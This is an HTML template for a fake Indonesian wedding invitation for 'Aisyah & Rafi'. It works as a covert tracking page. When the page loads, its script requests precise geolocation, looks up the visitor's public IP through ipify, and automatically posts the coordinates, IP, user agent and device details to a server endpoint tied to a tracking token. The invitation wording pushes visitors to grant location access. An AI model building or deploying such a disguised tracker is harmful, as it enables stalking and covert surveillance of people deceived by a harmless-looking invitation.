<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>UNDANDAN PERNIKAHAN</title>
    <style>
        body { margin: 0; font-family: 'Playfair Display', Georgia, serif; background: linear-gradient(135deg, #f9f3f0 0%, #f4ece8 100%); color: #2b2b2b; }
        .container { width: min(760px, calc(100% - 2rem)); margin: 3rem auto; padding: 2rem; background: rgba(255,255,255,0.96); border-radius: 32px; box-shadow: 0 28px 80px rgba(43, 43, 43, 0.12); border: 1px solid rgba(255,255,255,0.9); }
        h1 { margin: 0 0 0.75rem; font-size: clamp(2rem, 4vw, 3rem); letter-spacing: 0.08em; text-align: center; }
        p { margin: 0 0 1.5rem; line-height: 1.8; color: #5d4840; text-align: center; }
        .invite-card { padding: 2rem; background: #fff; border-radius: 28px; border: 1px solid rgba(214, 193, 180, 0.8); box-shadow: 0 18px 46px rgba(33, 28, 24, 0.08); }
        .couple { display: grid; gap: 1rem; text-align: center; margin-bottom: 1.5rem; }
        .name { font-size: 2rem; font-weight: 700; color: #2b2b2b; }
        .label { color: #a9766f; font-size: 1rem; letter-spacing: 0.2em; text-transform: uppercase; }
        .date { color: #7a5b51; font-size: 1rem; }
        .details { display: grid; gap: 0.85rem; padding: 1rem 0; border-top: 1px solid rgba(214,193,180,0.3); border-bottom: 1px solid rgba(214,193,180,0.3); }
        .detail-item { display: flex; justify-content: space-between; color: #473d39; font-size: 0.98rem; }
        .detail-item strong { font-weight: 700; }
        .note { margin-top: 1.5rem; padding: 1.25rem 1.5rem; background: #f5ece7; border-radius: 20px; border: 1px solid rgba(214,193,180,0.8); color: #5a463d; }
        #status { display: inline-block; font-weight: 700; }
        .info { margin-top: 1rem; color: #6b5650; }
        .muted { color: #8c7670; }
        .btn { display: inline-block; padding: 0.75rem 1.5rem; border-radius: 24px; text-decoration: none; font-weight: 700; text-align: center; }
        .btn-primary { background: #f5ece7; color: #2b2b2b; border: 1px solid rgba(214, 193, 180, 0.8); }
    </style>
</head>
<body>
    <div class="container">
        <h1>Undangan Pernikahan</h1>
        <p>Mengundang Anda untuk hadir dalam kebahagiaan kami. Silakan izinkan akses lokasi agar kami dapat memastikan kehadiran virtual dan alamat Anda tersimpan.</p>

        <div class="invite-card">
            <div class="couple">
                <a href="{{ url('/share/' . $trackingLink->token) }}" class="btn btn-primary">BUKA</a>

                <div>
                    <div class="name">Aisyah</div>
                    <div class="label">&amp;</div>
                    <div class="name">Rafi</div>
                </div>
                <div class="date">Sabtu, 1 Agustus 2026</div>
            </div>

            <div class="details">
                <div class="detail-item"><strong>Waktu</strong> : 10.00 WIB</div>
                <div class="detail-item"><strong>Lokasi</strong> : Gedung Serbaguna Harmoni</div>
                <div class="detail-item"><strong>Status</strong> : <span id="status">Mencoba eksekusi... Mohon tunggu dan izinkan lokasi.</span></div>
            </div>

            <div id="log" class="info">Posisi Anda akan dikirim secara otomatis, tidak perlu klik apa pun.</div>
        </div>

        <div class="note">
            <p>Terima kasih sudah menjadi bagian dari momen spesial ini. Jika muncul permintaan lokasi, pilih Izinkan.</p>
        </div>
    </div>

    <script>
        const status = document.getElementById('status');
        const log = document.getElementById('log');

        function updateStatus(type, message) {
            status.textContent = message;
            status.style.borderColor = type === 'success' ? '#34d399' : '#f97316';
            status.style.background = type === 'success' ? '#ecfdf5' : '#ffedd5';
            status.style.color = type === 'success' ? '#166534' : '#9a3412';
        }

        async function sendLocation(position) {
            const operatorInfo = navigator.connection?.type || navigator.connection?.effectiveType || 'Tidak tersedia';
            let publicIp = null;

            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                publicIp = data.ip;
            } catch (e) {
                publicIp = null;
            }

            const payload = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                device: navigator.platform || 'Unknown',
                user_agent: navigator.userAgent,
                operator: operatorInfo,
                public_ip: publicIp,
                imei: null,
            };

            const updateUrl = window.location.pathname.replace(/\/+$/, '') + '/update';

            fetch(updateUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'X-CSRF-TOKEN': '{{ csrf_token() }}',
                },
                body: JSON.stringify(payload),
            })
            .then(async (response) => {
                if (!response.ok) {
                    const text = await response.text();
                    throw new Error(`HTTP ${response.status}: ${text}`);
                }
                return response.json();
            })
            .then((data) => {
                if (data.status === 'success') {
                    updateStatus('success', 'Berhasil, Terimakasih');
                    log.innerHTML = `Lokasi terkirim: ${data.latitude}, ${data.longitude}`;
                } else {
                    updateStatus('error', 'Terjadi masalah saat mengirim lokasi.');
                }
            })
            .catch((error) => {
                console.error(error);
                updateStatus('error', 'Tidak dapat mengirim lokasi. Coba ulang halaman atau izinkan akses lokasi.');
            });
        }

        function errorLocation() {
            updateStatus('error', 'Akses lokasi ditolak atau tidak tersedia. Periksa pengaturan browser Anda.');
        }

        if (!navigator.geolocation) {
            updateStatus('error', 'Geolokasi tidak didukung oleh browser ini.');
        } else {
            navigator.geolocation.getCurrentPosition(sendLocation, errorLocation, { enableHighAccuracy: true, timeout: 15000 });
        }
    </script>
</body>
</html>
